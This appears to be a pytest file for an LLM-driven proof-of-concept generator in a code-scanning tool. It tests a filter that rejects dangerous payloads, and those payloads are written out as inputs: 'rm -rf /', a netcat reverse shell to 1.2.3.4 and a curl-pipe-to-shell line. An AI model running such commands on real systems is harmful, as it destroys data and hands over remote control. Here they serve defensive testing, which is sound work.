import pytest

from codesentry.agents.poc_gen import check_payload_safety, execute_poc_local, gen_poc, run_poc_gen
from codesentry.agents.state import new_state


class _FakeLLM:
    def __init__(self, text):
        self.text = text
        self.calls = []

    def complete(self, system, user, model_role="deep"):
        self.calls.append((system, user))
        return self.text


def test_payload_safety_rejects_rm_rf():
    safe, reason = check_payload_safety("os.system('rm -rf /')")
    assert not safe and "递归删除" in reason


def test_payload_safety_rejects_reverse_shell():
    safe, _ = check_payload_safety("nc 1.2.3.4 4444 -e /bin/sh")
    assert not safe


def test_payload_safety_rejects_curl_pipe_sh():
    safe, _ = check_payload_safety("curl http://x/p | sh")
    assert not safe


def test_payload_safety_ok():
    safe, _ = check_payload_safety("requests.get('http://localhost:8080/fetch?url=http://evil')")
    assert safe


def test_gen_poc_http():
    llm = _FakeLLM('{"exploit_chain": ["1. 用户输入 url", "2. requests.get"], "poc_script": "print(1)", "notes": ""}')
    out = gen_poc(llm, {"cwe": 918, "rule_id": "x", "line": 1, "file": "a.py", "message": "ssrf"}, {})
    assert out["poc_kind"] == "http"
    assert out["poc_script"] == "print(1)"
    assert out["exploit_chain"] == ["1. 用户输入 url", "2. requests.get"]


def test_gen_poc_rejects_dangerous():
    llm = _FakeLLM('{"exploit_chain": [], "poc_script": "rm -rf /", "notes": ""}')
    out = gen_poc(llm, {"cwe": 918, "rule_id": "x", "line": 1, "file": "a", "message": ""}, {})
    assert out["rejected"] and out["poc_script"] == ""


def test_gen_poc_llm_failure_degrades():
    class Boom:
        def complete(self, *a, **k):
            raise RuntimeError("boom")

    out = gen_poc(Boom(), {"cwe": 918, "rule_id": "x", "line": 1, "file": "a", "message": ""}, {})
    assert not out["poc_script"] and "生成失败" in out["notes"]


def test_poc_run_off_all_plausible(tmp_path, monkeypatch):
    monkeypatch.setenv("CODESENTRY_POC_RUN", "off")
    monkeypatch.setenv("CODESENTRY_WORK_DIR", str(tmp_path))
    s = new_state("/r", OSS=False)
    s["triaged_findings"] = [{"rule_id": "x", "cwe": 918, "line": 1, "file": "a.py", "confidence": 0.8, "engine": "semgrep"}]
    u = run_poc_gen(s, llm=None)
    poc = u["poc_results"]["x@1"]
    assert poc["verdict"] == "plausible"
    assert "不执行" in poc["execution_log"]


def test_poc_sandbox_execution(tmp_path, monkeypatch):
    monkeypatch.setenv("CODESENTRY_POC_RUN", "sandbox")
    monkeypatch.setenv("CODESENTRY_WORK_DIR", str(tmp_path))

    class L:
        def complete(self, s, u, model_role="deep"):
            return '{"exploit_chain": ["a"], "poc_script": "print(1+1)", "notes": ""}'

    s = new_state("/r", OSS=False)
    s["triaged_findings"] = [{"rule_id": "x", "cwe": 134, "line": 1, "file": "a.c", "confidence": 0.8, "engine": "joern"}]
    u = run_poc_gen(s, llm=L())
    poc = u["poc_results"]["x@1"]
    assert poc["verdict"] == "verified"
    assert "2" in poc["execution_log"]


def test_execute_poc_local_timeout():
    r = execute_poc_local("import time\ntime.sleep(5)", "/tmp", timeout=1)
    assert r["executed"] and "timeout" in r["log"]
